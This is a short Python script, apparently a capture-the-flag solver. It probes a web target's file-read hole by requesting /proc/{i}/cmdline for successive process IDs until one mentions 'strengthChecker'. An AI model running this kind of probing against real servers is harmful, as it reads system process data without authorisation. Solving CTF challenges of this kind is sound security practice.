#!/usr/bin/python

from sys import argv, exit
from requests import get

url = argv[1]
max_proc = argv[2]

try:
    max_proc = int(max_proc)
except:
    print("Number of tries must be an int")
    exit(0)

for i in range(max_proc):
    full_url = url+f"/proc/{i}/cmdline"
    r = get(full_url)
    if "strengthChecker" in r.text:
        print("[>] Flag:\n"+full_url)
        exit(0)
        
print("[!] Nothing found, try to increment the max_proc number")
